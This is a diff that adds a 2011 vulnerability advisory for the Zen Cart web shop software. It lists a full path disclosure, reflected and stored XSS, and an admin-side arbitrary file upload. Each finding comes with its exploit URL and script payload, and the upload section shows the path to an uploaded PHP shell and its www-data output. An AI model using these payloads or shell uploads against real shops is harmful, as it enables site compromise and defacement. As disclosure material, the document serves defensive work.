@@ -1,0 +1,114 @@
+[*]==================================================================>
+[*]
+[*]  Multiple Vulnerabilities in Zen Cart
+[*]
+[*]  [ Vendor SW     ]  => Zen Cart - http://www.zen-cart.com
+[*]  [ Version       ]  => 1.3.9f, 1.3.9h (but possible all versions)
+[*]  [ Vendor URL    ]  => www.zen-cart.com
+[*]  [ Tested on     ]  => BackTrack 4
+[*]  [ Category      ]  => WebApps/0day
+[*]  
+[*]  [ Date          ]  => 18 May 2011 - (0day from 28 Sep 2010)
+[*]  [ Author        ]  => Dr. Alberto Fontanella
+[*]  [ Author WEB    ]  => ictsec.wordpress.com
+[*]  [ Author E-Mail ]  => itsicurezza<0x40>yahoo.it
+[*]
+[*]  [ Popularity    ]  => intext:"Powered by Zen Cart"
+[*]                        206.000.000 hits
+[*]
+[*]<==================================================================
+
+
+
+[*] [ FULL PATH DISCLOSURE ]
+
+  [-] [ INFO ]
+
+   An error occurs when an attacker points a single page.
+   This leads to discover the full path of web server and vhost directory.
+
+  [-] [ EXPLOIT ] 
+
+   http://[host]/includes/languages/english.php
+   ...etc
+
+   Fatal error: Call to undefined function zen_href_link() in
+   /var/www/includes/languages/english.php on line 16
+
+
+
+[*] [ REFLECTED CROSS-SITE SCRIPTING (XSS) ]
+
+  [-] [ INFO ] 
+
+   This Issue has *not* been found into last tested version (1.3.9h) but
+   into all others versions. The "Quantity" field of Store Product don't 
+   sanitizes user input before to show output back to user. This leads an 
+   attacker to inject and execute arbitrary javascript and/or html code.
+
+  [-] [ EXPLOIT ]
+
+   http://[host]/index.php?main_page=shopping_cart (OR)
+
+   Your Shopping Cart Contents =>
+
+   Qty: "><script>alert("XSS")</script>
+
+   Click on "Change your Quantity" refresh button.
+
+
+
+[*] [ STORED CROSS-SITE SCRIPTING (XSS) ]
+
+  [-] [ INFO ]
+
+   You have to be logged as Admin. The "Zones Name & Code" fields of
+   Locations/Taxes don't sanitizes user input before to store it into
+   database and to show output back to user. This leads an attacker to 
+   inject and execute arbitrary javascript and/or html code.
+
+  [-] [ EXPLOIT ]
+
+   http://[host]/[admin]/zones.php?page=1&action=new (OR)
+
+   Locations/Taxes => Zones
+   
+   Zones Name: "><script>alert("XSS")</script>
+   Zones Code: "><script>alert("XSS")</script>
+   
+   So, you inject evil code that can not be deleted. (">) destroy the 
+   page structure so the Admin have to work directly on database 
+   (phpmyadmin, etc.) to restore it and delete evil code.   
+
+   ...etc, others Stored XSS are presents on admin console.
+
+
+
+[*] [ ARBITRARY FILE UPLOAD ]
+
+  [-] [ INFO ]
+ 
+   Banner Manager don't check the extension/type of image to upload.
+   This leads an attacker that have administrative privileges to
+   upload arbitrary files on server (ie. backdoors, php shells, etc.) 
+
+  [-] [ EXPLOIT ]
+
+   http://[host]/[admin]/banner_manager.php?action=new (OR)
+
+   Tools => Banner Manager => New Banner => Image: phpShell.php
+
+   The uploaded file will be located into:
+
+    http://[host]/images/phpShell.php
+
+    uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+
+
+[ EOF ]
+
+  Please feel free to write me a bit if you want some information or
+  a professional consultancy.    
+
+
